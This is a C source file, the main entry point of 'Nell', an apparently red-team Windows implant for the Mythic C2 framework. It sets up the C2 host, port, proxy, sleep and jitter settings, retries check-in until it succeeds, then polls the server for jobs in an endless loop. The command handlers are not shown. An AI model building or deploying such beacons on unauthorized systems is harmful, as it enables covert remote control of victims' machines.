/**
 * Nell Agent - Main Entry Point
 * Mythic C2 Compatible Agent
 */

#include <windows.h>

#include "nell.h"
#include "config.h"
#include "Checkin.h"
#include "Transport.h"
#include "Command.h"

// Global config instance
PCONFIG_NELL nellConfig = NULL;

// Initialize agent configuration
BOOL InitConfig(VOID)
{
    nellConfig = (PCONFIG_NELL)LocalAlloc(LPTR, sizeof(CONFIG_NELL));
    if (!nellConfig)
        return FALSE;

    // Allocate mutable buffer for UUID (will be updated after checkin)
    nellConfig->agentID = (PCHAR)LocalAlloc(LPTR, 37);
    if (!nellConfig->agentID)
        return FALSE;
    memcpy(nellConfig->agentID, CONFIG_INIT_UUID, 36);
    nellConfig->agentID[36] = '\0';

    nellConfig->hostName = (PWCHAR)CONFIG_HOSTNAME;
    nellConfig->httpPort = CONFIG_PORT;
    nellConfig->endPoint = (PWCHAR)CONFIG_ENDPOINT;
    nellConfig->userAgent = (PWCHAR)CONFIG_USERAGENT;
    nellConfig->httpMethod = (PWCHAR)CONFIG_HTTP_METHOD;
    nellConfig->isSSL = CONFIG_SSL;
    nellConfig->isProxyEnabled = CONFIG_PROXY_ENABLED;
    nellConfig->proxyURL = (PWCHAR)CONFIG_PROXY_URL;
    nellConfig->sleeptime = CONFIG_SLEEP_TIME;
    nellConfig->jitter = CONFIG_JITTER;

    srand(GetTickCount()); // Seed PRNG for jitter

    return TRUE;
}

// Main loop
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Setup our config struct
    if (!InitConfig())
        return 1;

    // Try to checkin until we succeed
    while (!DoCheckin())
    {
        Sleep(nellConfig->sleeptime * 1000);
    }

    // Enter the matrix
    while (TRUE)
    {
        // Check for new jobs
        if (!routine())
        {
            // Something went wrong, take a nap before retrying
            Sleep(nellConfig->sleeptime * 1000);
        }
    }

    return 0;
}

// Optional: Console entry point for debugging
#ifdef DEBUG_BUILD
int main(int argc, char* argv[])
{
    return WinMain(GetModuleHandle(NULL), NULL, NULL, SW_SHOW);
}
#endif
